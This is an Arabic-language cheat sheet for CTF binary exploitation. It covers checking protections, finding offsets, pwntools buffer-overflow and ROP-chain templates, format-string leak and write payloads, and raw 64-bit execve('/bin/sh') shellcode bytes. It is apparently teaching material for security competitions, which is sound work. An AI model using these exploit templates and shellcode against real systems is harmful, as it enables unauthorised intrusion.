<a id="-pwnbinary-exploitation-ctf-cheatsheet"></a>
# 💥 مرجع تحديات استغلال الملفات التنفيذية (Pwn) في CTF

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Pwn-CTF.tr.md) • [🇬🇷 Ελληνικά](Pwn-CTF.el.md)

---

<a id="-initial-analysis"></a>
## 🔍 التحليل الأولي

```bash
# فحص وسائل الحماية
checksec binary

# معلومات الملف
file binary
ldd binary        # المكتبات

# تشغيل الملف
./binary
ltrace ./binary   # استدعاءات المكتبات
strace ./binary   # استدعاءات النظام
```

---

<a id="-protections"></a>
## 🛡️ وسائل الحماية

| وسيلة الحماية | الوصف | التجاوز |
|------------|-------------|--------|
| **NX** | منع التنفيذ من المكدس | ROP |
| **ASLR** | عناوين عشوائية | تسريب عنوان ثم الحساب |
| **PIE** | عنوان أساس عشوائي للملف التنفيذي | تسريب عنوان في الملف التنفيذي |
| **Canary** | قيمة حماية للمكدس | تسريب قيمة Canary |
| **RELRO** | حماية جدول الإزاحات العام (GOT) | استخدام تقنيات أخرى |

---

<a id="-buffer-overflow"></a>
## 📏 تجاوز سعة المخزن المؤقت (Buffer Overflow)

<a id="find-offset"></a>
### تحديد الإزاحة
```bash
# باستخدام pwntools
cyclic 200        # توليد نمط
cyclic -l 0x6161616a  # تحديد الإزاحة

# باستخدام GDB
pattern create 200
pattern offset 0x6161616a
```

<a id="basic-exploit-pwntools"></a>
### مثال استغلال أساسي باستخدام pwntools
```python
from pwn import *

p = process('./binary')
# p = remote('host', port)

offset = 64
payload = b'A' * offset
payload += p64(0xdeadbeef)  # عنوان العودة

p.sendline(payload)
p.interactive()
```

---

<a id="-rop-return-oriented-programming"></a>
## 🔗 البرمجة الموجّهة بالعودة (ROP)

<a id="find-gadgets"></a>
### البحث عن مقاطع Gadgets
```bash
ROPgadget --binary binary
ropper -f binary

# مقاطع Gadgets شائعة
pop rdi; ret
pop rsi; pop r15; ret
ret                  # لمحاذاة المكدس
```

<a id="rop-chain-pwntools"></a>
### سلسلة ROP باستخدام pwntools
```python
from pwn import *

elf = ELF('./binary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP(elf)

# بناء السلسلة
rop.call(elf.plt['puts'], [elf.got['puts']])
rop.call(elf.symbols['main'])

payload = b'A' * offset + rop.chain()
```

---

<a id="-shellcode"></a>
## 🐚 Shellcode

<a id="64-bit-linux"></a>
### نظام Linux ببنية 64 بت
```python
# pwntools shellcraft
shellcode = asm(shellcraft.sh())

# يدويًا
# execve("/bin/sh", NULL, NULL)
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
```

---

<a id="-format-string"></a>
## 📚 ثغرات سلاسل التنسيق (Format String)

```bash
# تسريب القيم
%p %p %p %p %p
%x %x %x %x %x

# كتابة
%n - كتابة عدد البايتات المطبوعة
%hhn - كتابة بايت
```

```python
# pwntools fmtstr
from pwn import *
fmtstr_payload(offset, {target_addr: value})
```

---

<a id="-tools"></a>
## 🛠️ الأدوات

| الأداة | الاستخدام |
|------|-----|
| **pwntools** | مكتبة Python لاستغلال الملفات التنفيذية |
| **GDB + GEF** | تنقيح البرامج |
| **ROPgadget** | البحث عن مقاطع ROP |
| **one_gadget** | البحث عن مقطع استغلال واحد في libc |
| **checksec** | فحص وسائل الحماية |

---

<a id="-pwn-checklist"></a>
## 📋 قائمة تحديات Pwn

```markdown
□ checksec binary
□ تحديد الثغرة (تجاوز السعة أو سلسلة التنسيق)
□ حساب الإزاحة
□ فحص وسائل الحماية
□ بناء الاستغلال باستخدام Shellcode أو ROP
□ الاختبار محليًا
□ التكييف للعمل عن بُعد
```

---

**العودة إلى CTF:** [🏁 نظرة عامة على CTF](README.ar.md)

> **توضيح للسياق:** أمثلة pwntools مقتطفات تعليمية، وتحتاج إلى تحديد بنية الهدف وحجم الكلمة وضبط الإزاحة والعناوين وفق التحدي. تحديدًا، يجب ضبط سياق amd64 قبل توليد Shellcode المقصود لنظام 64 بت؛ مجرد عنوان الفقرة لا يضبط السياق. يوضح [توثيق pwntools](https://docs.pwntools.com/en/stable/context.html) أن context يتحكم في البنية ونظام التشغيل وحجم الكلمة. ROP هو بناء سلوك عبر سلسلة مقاطع تعليمات صغيرة، وGadget مقطع ينتهي عادة بتعليمة نقل تحكم.
